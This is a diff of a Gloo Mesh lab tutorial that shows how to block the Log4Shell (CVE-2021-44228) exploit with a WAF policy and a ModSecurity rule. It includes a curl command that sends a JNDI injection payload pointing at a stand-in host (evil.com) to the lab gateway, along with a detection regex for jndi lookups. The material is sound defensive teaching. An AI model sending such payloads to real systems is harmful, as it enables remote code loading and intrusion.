@@ -810,7 +810,7 @@ In this section of the lab, take a quick look at how to prevent the `log4j` expl
 2. Confirm that a bad JNDI request currently succeeds. Note the `200` success response. Later, you create a WAF policy to block such requests.
 
 ```sh
-curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" https://${ENDPOINT_HTTPS_GW_CLUSTER1}/
+curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" https://${HTTP_GATEWAY_ENDPOINT}/
 ```
 
 **WAF policy**
@@ -821,61 +821,61 @@ With the Gloo Mesh WAF policy custom resource, you can create reusable policies 
   * In the route table, the frontend route has the label `waf: "true"`. The WAF policy applies to routes with this same lable.
   * In the WAF policy config, the default core rule set is disabled. Instead, a custom rule set is created for the `log4j` attack.
 
-  ```yaml
-  cat << EOF | kubectl --context ${MGMT} apply -f -
-  apiVersion: networking.gloo.solo.io/v2
-  kind: RouteTable
-  metadata:
-    name: frontend
-    namespace: web-team
-  spec:
-    hosts:
-      - '*'
-    virtualGateways:
-      - name: north-south-gw
-        namespace: ops-team
-        cluster: mgmt
-    workloadSelectors: []
-    http:
-      - name: frontend
-        labels:
-          waf: "true"
-        forwardTo:
-          destinations:
-            - ref:
-                name: frontend
-                namespace: web-ui
-                cluster: cluster1
-              port:
-                number: 80
-  ---
-  apiVersion: security.policy.gloo.solo.io/v2
-  kind: WAFPolicy
-  metadata:
-    name: log4jshell
-    namespace: web-team
-  spec:
-    applyToRoutes:
-    - route:
-        labels:
-          waf: "true"
-    config:
-      disableCoreRuleSet: true
-      customInterventionMessage: 'Log4Shell malicious payload'
-      customRuleSets:
-      - ruleStr: |
-          SecRuleEngine On
-          SecRequestBodyAccess On
-          SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*  
-            "@rx \${jndi:(?:ldaps?|iiop|dns|rmi)://" 
-            "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
-  EOF
-  ```
+```yaml
+cat << EOF | kubectl --context ${MGMT} apply -f -
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: frontend
+  namespace: web-team
+spec:
+  hosts:
+    - '*'
+  virtualGateways:
+    - name: north-south-gw
+      namespace: ops-team
+      cluster: mgmt
+  workloadSelectors: []
+  http:
+    - name: frontend
+      labels:
+        waf: "true"
+      forwardTo:
+        destinations:
+          - ref:
+              name: frontend
+              namespace: web-ui
+              cluster: cluster1
+            port:
+              number: 80
+---
+apiVersion: security.policy.gloo.solo.io/v2
+kind: WAFPolicy
+metadata:
+  name: log4jshell
+  namespace: web-team
+spec:
+  applyToRoutes:
+  - route:
+      labels:
+        waf: "true"
+  config:
+    disableCoreRuleSet: true
+    customInterventionMessage: 'Log4Shell malicious payload'
+    customRuleSets:
+    - ruleStr: |
+        SecRuleEngine On
+        SecRequestBodyAccess On
+        SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*  
+          "@rx \${jndi:(?:ldaps?|iiop|dns|rmi)://" 
+          "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
+EOF
+```
 
 4. Try the request again.
 
 ```sh
-curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" https://${ENDPOINT_HTTPS_GW_CLUSTER1}/
+curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" https://${HTTP_GATEWAY_ENDPOINT}/
 ```
 
 Note that the is now blocked with the custom intervention message from the WAF policy. 
@@ -984,7 +984,7 @@ EOF
 * Test Rate Limiting
 
 ```sh
-for i in {1..6}; do curl -iksS -X GET https://${ENDPOINT_HTTPS_GW_CLUSTER1}/ | tail -n 10; done
+for i in {1..6}; do curl -iksS -X GET https://${HTTP_GATEWAY_ENDPOINT}/ | tail -n 10; done
 ```
 
 * Expected Response - If you try the Online Boutique UI you will see a blank page because the rate-limit response is in the headers
